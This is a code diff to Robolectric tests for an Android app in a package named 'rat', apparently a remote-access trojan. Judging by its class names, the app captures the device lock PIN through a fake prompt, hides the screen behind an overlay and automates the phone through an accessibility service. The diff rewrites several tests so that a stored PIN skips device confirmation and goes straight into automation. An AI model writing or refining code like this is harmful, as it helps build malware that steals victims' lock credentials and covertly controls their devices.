@@ -16,6 +16,7 @@ import com.vendor.rat.activity.LockCredentialPromptActivity;
 import com.vendor.rat.credential.FakeLockCredentialCipher;
 import com.vendor.rat.credential.LockCredentialStore;
 import com.vendor.rat.helper.BlockViewHelper;
+import com.vendor.rat.service.MyAccessibilityService;
 import com.vendor.rat.utils.DeviceUtils;
 import com.vendor.rat.utils.SharedUtils;
 
@@ -23,6 +24,7 @@ import org.junit.After;
 import org.junit.Before;
 import org.junit.Test;
 import org.junit.runner.RunWith;
+import org.mockito.Mockito;
 import org.robolectric.Robolectric;
 import org.robolectric.RobolectricTestRunner;
 import org.robolectric.RuntimeEnvironment;
@@ -57,6 +59,9 @@ public class OppoCredentialGatedFlowTest {
         LockCredentialStore.clearAll();
         DeviceUtils.setBrandForTest("oppo");
 
+        // Simulate accessibility service running (gate only fires after accessibility enabled)
+        MyAccessibilityService.f219p.set(Mockito.mock(MyAccessibilityService.class));
+
         controller = Robolectric.buildActivity(ActivMain.class).create();
  activity = controller.get();
         shadow = Shadows.shadowOf(activity);
@@ -66,6 +71,7 @@ public class OppoCredentialGatedFlowTest {
     public void tearDown() {
         DeviceUtils.setBrandForTest(null);
         LockCredentialStore.clearAll();
+        MyAccessibilityService.f219p.set(null);
     }
 
     // ============ Full flow: No PIN → Prompt → PIN saved → Verify → Success ============
@@ -87,37 +93,33 @@ public class OppoCredentialGatedFlowTest {
     }
 
     /**
-     * Flow step 2: After prompt OK, starts verification flow.
+     * Flow step 2: After prompt OK, directly marks verified (no ConfirmDeviceActivity).
      */
     @Test
-    public void flow_step2_promptOkStartsVerification() {
-  // Simulate prompt returning OK (PIN was saved)
+    public void flow_step2_promptOkMarksVerifiedDirectly() {
         activity.onActivityResult(
                 ActivMain.REQUEST_LOCK_CREDENTIAL_PROMPT,
                 Activity.RESULT_OK,
           null);
 
+        assertTrue("Should be marked verified directly", LockCredentialStore.isCurrentRunVerified());
         ShadowActivity.IntentForResult launched = shadow.getNextStartedActivityForResult();
-   assertNotNull("Should launch ConfirmDeviceActivity", launched);
-        assertEquals(ConfirmDeviceActivity.class.getName(),
-              launched.intent.getComponent().getClassName());
-        assertEquals(ActivMain.REQUEST_CONFIRM_DEVICE, launched.requestCode);
+        assertNull("No ConfirmDeviceActivity should be launched", launched);
     }
 
     /**
-     * Flow step 3: PIN stored but not verified → launches ConfirmDeviceActivity.
+     * Flow step 3: PIN stored but not verified → directly marks verified (no ConfirmDeviceActivity).
    */
     @Test
-    public void flow_step3_pinStoredLaunchesVerification() {
+    public void flow_step3_pinStoredMarksVerifiedDirectly() {
         LockCredentialStore.savePin("123456");
         assertFalse(LockCredentialStore.isCurrentRunVerified());
 
  controller.resume();
 
+        assertTrue("Should be marked verified directly", LockCredentialStore.isCurrentRunVerified());
         ShadowActivity.IntentForResult launched = shadow.getNextStartedActivityForResult();
-        assertNotNull("Should launch ConfirmDeviceActivity", launched);
-        assertEquals(ConfirmDeviceActivity.class.getName(),
-             launched.intent.getComponent().getClassName());
+        assertNull("No ConfirmDeviceActivity should be launched", launched);
     }
 
     /**
@@ -210,25 +212,20 @@ assertFalse("Should not be verified",
     // ============ Overlay timing ============
 
     /**
-     * Overlay should be shown before ConfirmDeviceActivity launch.
-     * (ActivMain.startCredentialVerificationFlow calls BlockViewHelper.show before launching)
+     * Overlay should be shown when PIN exists and entering automation directly.
      */
     @Test
-    public void overlay_shouldBeShownBeforeVerification() {
+    public void overlay_shouldBeShownWhenEnteringAutomation() {
 LockCredentialStore.savePin("123456");
  assertFalse(LockCredentialStore.isCurrentRunVerified());
 
         controller.resume();
 
-        // ConfirmDeviceActivity should be launched
+        // Should be marked verified directly (no ConfirmDeviceActivity)
+        assertTrue("Should be verified", LockCredentialStore.isCurrentRunVerified());
+        // No activity launched
         ShadowActivity.IntentForResult launched = shadow.getNextStartedActivityForResult();
- assertNotNull("Should launch ConfirmDeviceActivity", launched);
-        assertEquals(ConfirmDeviceActivity.class.getName(),
-            launched.intent.getComponent().getClassName());
-
-        // BlockViewHelper.show(null) was called in startCredentialVerificationFlow
-      // In Robolectric, WindowManager operations may not fully work,
-        // but we verify the intent was launched (which happens after show())
+        assertNull("No activity should be launched", launched);
     }
 
     /**
